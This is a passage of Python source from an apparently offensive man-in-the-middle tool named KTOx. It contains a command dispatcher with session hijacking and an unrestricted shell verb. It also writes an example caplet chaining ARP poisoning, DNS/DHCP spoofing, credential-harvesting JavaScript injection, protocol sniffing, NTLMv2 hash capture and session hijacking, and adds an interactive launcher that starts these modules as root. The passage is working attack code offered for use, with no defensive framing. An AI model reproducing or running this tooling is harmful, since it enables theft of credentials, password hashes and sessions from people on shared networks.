                elif verb == "session.hijack":
                    sh = SessionHijacker(env.get("IFACE", ctx.get("iface","wlan0")))
                    t = sh.start(); threads.append(t)
                    console.print(f"  [{C_GOOD}]session.hijack — active[/{C_GOOD}]")

                # shell <command>
                elif verb == "shell":
                    cmd_str = " ".join(parts[1:])
                    result  = subprocess.run(
                        cmd_str, shell=True,
                        capture_output=True, text=True
                    )
                    console.print(f"  [{C_ASH}]{result.stdout.strip()}[/{C_ASH}]")

                # stop <module>
                elif verb == "stop":
                    stop_flag.set()
                    console.print(f"  [{C_ORANGE}]stop — signalled[/{C_ORANGE}]")

                else:
                    console.print(f"  [{C_ORANGE}]unknown command: {cmd}[/{C_ORANGE}]")

            except Exception as e:
                console.print(f"  [{C_BLOOD}]caplet error [{cmd}]: {e}[/{C_BLOOD}]")

        return threads

    @staticmethod
    def example_caplet(path, attacker_ip, iface="wlan0", gateway_ip=""):
        """Write an example .ktox caplet file."""
        content = f"""# KTOx Caplet — Full MITM Session
# Run with: sudo python3 ktox.py --caplet {path}

set IFACE       {iface}
set ATTACKER_IP {attacker_ip}
set GATEWAY_IP  {gateway_ip}

echo Starting KTOx full MITM session...

# Start MITM engine (ARP poison + DNS + DHCP)
mitm.start

# Inject credential harvester into HTTP pages
js.inject credential_intercept

# Sniff all cleartext protocols
proto.sniff

# Capture NTLMv2 hashes
ntlm.capture

# Hijack sessions
session.hijack

# Capture all traffic to PCAP
pcap.start

# Run for 5 minutes
wait 300

# Stop everything
stop
echo Session complete. Check ktox_loot/ for loot.
"""
        os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
        with open(path, "w") as f:
            f.write(content)
        return path


# ══════════════════════════════════════════════════════════════════════════════
# ── ADVANCED SESSION LAUNCHER ─────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

def advanced_menu(iface, attacker_ip, gateway_ip):
    """Interactive advanced module selector."""
    section("ADVANCED ENGINE CONFIGURATION")

    console.print(Panel(
        f"  {tag('Interface:',   C_BLOOD)}  [{C_WHITE}]{iface}[/{C_WHITE}]\n"
        f"  {tag('Attacker IP:', C_BLOOD)}  [{C_WHITE}]{attacker_ip}[/{C_WHITE}]\n"
        f"  {tag('Gateway:',     C_STEEL)}  [{C_ASH}]{gateway_ip}[/{C_ASH}]",
        border_style=C_RUST,
        title=f"[bold {C_BLOOD}]◈ KTOX ADVANCED ENGINE[/bold {C_BLOOD}]",
        padding=(1,2)
    ))

    js_on     = Confirm.ask(f"  [{C_BLOOD}]JS/HTML Injector?[/{C_BLOOD}]",          default=True)
    proto_on  = Confirm.ask(f"  [{C_BLOOD}]Multi-Protocol Sniffer?[/{C_BLOOD}]",    default=True)
    pcap_on   = Confirm.ask(f"  [{C_BLOOD}]PCAP Capture?[/{C_BLOOD}]",              default=True)
    ntlm_on   = Confirm.ask(f"  [{C_BLOOD}]NTLMv2 Hash Capture?[/{C_BLOOD}]",      default=True)
    session_on= Confirm.ask(f"  [{C_BLOOD}]Session Hijacker?[/{C_BLOOD}]",          default=True)

    js_payload = "credential_intercept"
    if js_on:
        console.print(
            f"\n  [{C_STEEL}]Available payloads: "
            f"{', '.join(BUILTIN_PAYLOADS.keys())}[/{C_STEEL}]"
        )
        js_payload = Prompt.ask(
            f"  [{C_BLOOD}]JS payload[/{C_BLOOD}]",
            default="credential_intercept"
        )

    pcap_filter = ""
    if pcap_on:
        pcap_filter = Prompt.ask(
            f"  [{C_STEEL}]PCAP BPF filter [{C_DIM}]empty=all traffic[/{C_DIM}][/{C_STEEL}]",
            default=""
        )

    section("ADVANCED ENGINE STARTING")
    threads = []

    if js_on:
        inj = JSInjector(attacker_ip, payload_name=js_payload)
        threads.append(inj.start())

    if proto_on:
        snf = MultiProtocolSniffer(iface)
        threads.append(snf.start())

    if pcap_on:
        cap = PCAPCapture(iface, bpf_filter=pcap_filter)
        threads.append(cap.start())

    if ntlm_on:
        nc = NTLMCapture(iface, attacker_ip)
        threads.append(nc.start())

    if session_on:
        sh = SessionHijacker(iface)
        threads.append(sh.start())

    section("ADVANCED ENGINE ACTIVE")
    console.print(Panel(
        f"  {tag('JS Injector:',     C_GOOD if js_on      else C_DIM)}  "
        f"{'ACTIVE — ' + js_payload if js_on else 'OFF'}\n"
        f"  {tag('Proto Sniffer:',   C_GOOD if proto_on   else C_DIM)}  "
        f"{'ACTIVE' if proto_on else 'OFF'}\n"
        f"  {tag('PCAP Capture:',    C_GOOD if pcap_on    else C_DIM)}  "
        f"{'ACTIVE' if pcap_on else 'OFF'}\n"
        f"  {tag('NTLMv2 Capture:',  C_GOOD if ntlm_on    else C_DIM)}  "
        f"{'ACTIVE' if ntlm_on else 'OFF'}\n"
        f"  {tag('Session Hijacker:', C_GOOD if session_on else C_DIM)}  "
        f"{'ACTIVE' if session_on else 'OFF'}\n\n"
        f"  [{C_DIM}]Ctrl+C to stop[/{C_DIM}]",
        border_style=C_RUST,
        title=f"[bold {C_BLOOD}]◈ ENGINE STATUS[/bold {C_BLOOD}]",
        padding=(1,2)
    ))

    try:
        while not stop_flag.is_set():
            time.sleep(1)
    except KeyboardInterrupt:
        stop_flag.set()
        console.print(f"\n  [{C_ORANGE}]Advanced engine stopped.[/{C_ORANGE}]")
        console.print(f"  [{C_STEEL}]Loot directory: {loot_dir}/[/{C_STEEL}]")


if __name__ == "__main__":
    if os.geteuid() != 0:
        print("ERROR: Must run as root"); sys.exit(1)
    iface       = Prompt.ask("Interface", default="wlan0")
    attacker_ip = Prompt.ask("Attacker IP")
    gateway_ip  = Prompt.ask("Gateway IP", default="")
    advanced_menu(iface, attacker_ip, gateway_ip)
